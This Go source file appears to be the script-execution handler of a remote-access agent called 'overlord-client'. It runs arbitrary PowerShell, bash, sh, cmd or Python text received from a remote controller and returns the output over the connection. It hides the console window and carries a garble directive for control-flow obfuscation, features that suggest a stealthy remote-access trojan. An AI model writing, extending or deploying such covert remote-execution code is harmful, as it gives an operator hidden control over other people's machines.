package handlers

import (
	"context"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"time"

	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

const scriptExecutionTimeout = 5 * time.Minute

func StartScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, scriptContent string, scriptType string) {
	goSafe("script execute", env.Cancel, func() {
		if err := HandleScriptExecute(ctx, env, cmdID, scriptContent, scriptType); err != nil {
			log.Printf("script: failed to send result for command %s: %v", cmdID, err)
		}
	})
}

func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, scriptContent string, scriptType string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("script: executing %s script (length: %d bytes)", scriptType, len(scriptContent))

	execCtx, cancel := context.WithTimeout(ctx, scriptExecutionTimeout)
	defer cancel()

	var cmd *exec.Cmd
	switch scriptType {
	case "powershell":
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(execCtx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
		} else {

			cmd = exec.CommandContext(execCtx, "pwsh", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
		}
	case "bash":
		if runtime.GOOS == "windows" {

			cmd = exec.CommandContext(execCtx, "bash", "-c", scriptContent)
		} else {
			cmd = exec.CommandContext(execCtx, "bash", "-c", scriptContent)
		}
	case "sh":
		cmd = exec.CommandContext(execCtx, "sh", "-c", scriptContent)
	case "cmd":
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(execCtx, "cmd.exe", "/c", scriptContent)
		} else {
			return writeScriptCommandResult(env, wire.CommandResult{
				Type:      "command_result",
				CommandID: cmdID,
				OK:        false,
				Message:   "cmd.exe not available on non-Windows systems",
			})
		}
	case "python":
		cmd = exec.CommandContext(execCtx, "python", "-c", scriptContent)
	case "python3":
		cmd = exec.CommandContext(execCtx, "python3", "-c", scriptContent)
	default:
		return writeScriptCommandResult(env, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   "unsupported script type: " + scriptType,
		})
	}

	hideCmdWindow(cmd)

	output, err := cmd.CombinedOutput()

	if err != nil {

		if execCtx.Err() == context.DeadlineExceeded {
			return writeScriptResult(env, wire.ScriptResult{
				Type:      "script_result",
				CommandID: cmdID,
				OK:        false,
				Output:    string(output),
				Error:     "Script execution timed out after " + scriptExecutionTimeout.String(),
			})
		}

		return writeScriptResult(env, wire.ScriptResult{
			Type:      "script_result",
			CommandID: cmdID,
			OK:        false,
			Output:    string(output),
			Error:     err.Error(),
		})
	}

	log.Printf("script: execution completed successfully (%d bytes output)", len(output))
	return writeScriptResult(env, wire.ScriptResult{
		Type:      "script_result",
		CommandID: cmdID,
		OK:        true,
		Output:    strings.TrimSpace(string(output)),
	})
}

func writeScriptResult(env *agentRuntime.Env, result wire.ScriptResult) error {
	writeCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	return wire.WriteMsg(writeCtx, env.Conn, result)
}

func writeScriptCommandResult(env *agentRuntime.Env, result wire.CommandResult) error {
	writeCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	return wire.WriteMsg(writeCtx, env.Conn, result)
}
